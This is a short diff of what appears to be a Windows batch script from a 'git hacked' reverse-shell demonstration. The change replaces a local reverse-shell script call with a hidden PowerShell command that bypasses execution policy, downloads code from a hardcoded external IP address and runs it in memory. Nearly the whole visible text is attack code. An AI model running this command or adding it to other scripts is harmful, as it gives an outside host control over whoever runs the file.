@@ -56,4 +56,4 @@ echo hacked > GITHACKED
 
 :: Reverse Shell - Change TCPClient() host/port (e.g: localhost,1337)
 :: 
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass .\revsh_powersh.ps1
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://121.43.108.230:80/a'))"
